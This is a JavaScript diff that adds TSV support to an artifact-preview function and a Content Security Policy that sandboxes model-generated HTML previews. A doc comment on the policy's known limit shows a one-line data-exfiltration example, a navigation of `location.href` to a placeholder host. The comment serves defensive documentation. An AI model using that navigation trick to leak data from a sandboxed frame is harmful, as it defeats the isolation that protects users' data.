@@ -80,7 +80,13 @@ export function previewTypeOf(artifact) {
   if (artifact?.kind === 'image' || mimeType.startsWith('image/')) return 'image';
   if (mimeType === 'application/pdf') return 'pdf';
   if (mimeType === 'text/markdown') return 'markdown';
-  if (mimeType === 'text/csv' || /\.csv$/i.test(name)) return 'csv';
+  if (
+    mimeType === 'text/csv' ||
+    mimeType === 'text/tab-separated-values' ||
+    /\.(csv|tsv)$/i.test(name)
+  ) {
+    return 'csv';
+  }
   if (mimeType === 'application/x-ipynb+json' || /\.ipynb$/i.test(name)) return 'ipynb';
   if (/\.html?$/i.test(name)) return 'html';
   if (/\.svg$/i.test(name)) return 'svg';
@@ -94,6 +100,37 @@ export function isTextArtifact(artifact) {
   return ['markdown', 'json', 'code', 'html', 'svg', 'csv', 'ipynb'].includes(
     previewTypeOf(artifact)
   );
+}
+
+/**
+ * Content Security Policy of a previewed HTML artifact. The preview runs a
+ * model's scripts, so it may run inline code but not load or send anything
+ * through a subresource request: no `fetch`, WebSocket, remote image/font/frame
+ * or form post. Same stance as the MCP Apps sandbox (`default-src 'none'`,
+ * `connect-src 'none'`).
+ *
+ * Known limit: CSP does not govern navigation of the frame itself, and the
+ * iframe's `sandbox="allow-scripts"` does not block it either, so a script can
+ * still run `location.href = 'https://host/?' + data` (or use `<meta refresh>`).
+ * The sandbox does stop top-level navigation, popups and access to the parent,
+ * cookies and storage.
+ */
+export const HTML_PREVIEW_CSP =
+  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:; form-action 'none'; base-uri 'none'";
+
+/**
+ * Put the preview CSP in front of an HTML artifact's markup. A leading
+ * doctype stays first so the document does not fall into quirks mode.
+ *
+ * @param {unknown} html
+ * @returns {string}
+ */
+export function withPreviewCsp(html) {
+  const source = String(html ?? '');
+  const meta = `<meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">`;
+  const doctype = source.match(/^\s*<!doctype[^>]*>/i);
+  if (!doctype) return meta + source;
+  return doctype[0] + meta + source.slice(doctype[0].length);
 }
 
 /** highlight.js language by file extension, where the two differ or matter. */
